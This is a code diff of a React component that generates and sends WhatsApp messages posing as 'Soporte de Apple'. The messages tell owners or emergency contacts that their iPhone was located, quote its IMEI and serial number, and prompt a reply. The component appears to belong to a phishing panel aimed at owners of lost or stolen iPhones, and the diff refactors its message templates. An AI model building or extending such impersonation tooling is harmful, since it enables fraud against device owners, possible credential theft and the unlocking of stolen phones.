@@ -3,7 +3,6 @@ import React, { useState, useEffect } from 'react';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Badge } from '@/components/ui/badge';
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { toast } from '@/hooks/use-toast';
 import { supabase } from '@/integrations/supabase/client';
 import { MessageSquare, Eye, Trash2 } from 'lucide-react';
@@ -83,9 +82,11 @@ const ProcessList = () => {
     }
   };
 
-  const generateMessage = (process: Process, isEmergency: boolean = false) => {
-    const baseMessage = isEmergency 
-      ? `Soporte de Apple 👨🏽‍🔧
+  const generateMessage = (process: Process) => {
+    const isEmergency = process.contact_type === 'emergencia';
+    
+    if (isEmergency) {
+      return `Soporte de Apple 👨🏽‍🔧
 
 🚨 Usted ha sido registrado como contacto de emergencia.
 
@@ -97,8 +98,9 @@ const ProcessList = () => {
 📟 IMEI: ${process.imei}
 🔑 Serie: ${process.serial_number}
 
-🧾 Escribe la palabra Menu para solicitar asistencia.`
-      : `Soporte de Apple 👨🏽‍🔧
+🧾 Escribe la palabra Menu para solicitar asistencia.`;
+    } else {
+      return `Soporte de Apple 👨🏽‍🔧
 
 ✅ iPhone localizado con éxito
 
@@ -110,8 +112,7 @@ const ProcessList = () => {
 🗺 Departamento: 
 
 🧾 Escribe la palabra Menu para solicitar asistencia.`;
-
-    return baseMessage;
+    }
   };
 
   const sendMessage = async (process: Process) => {
@@ -135,8 +136,7 @@ const ProcessList = () => {
         return;
       }
 
-      const isEmergency = process.contact_type === 'emergencia';
-      const message = generateMessage(process, isEmergency);
+      const message = generateMessage(process);
       const phoneNumber = `${process.country_code}${process.phone_number}`;
 
       // Send message via WhatsApp API
@@ -253,7 +253,7 @@ const ProcessList = () => {
                 <div>
                   <CardTitle className="text-blue-300">{process.client_name}</CardTitle>
                   <p className="text-blue-200/70 text-sm">
-                    {process.country_code}{process.phone_number} • {process.contact_type}
+                    {process.country_code}{process.phone_number} • {process.contact_type === 'propietario' ? 'Propietario' : 'Contacto de Emergencia'}
                   </p>
                 </div>
                 <Badge 
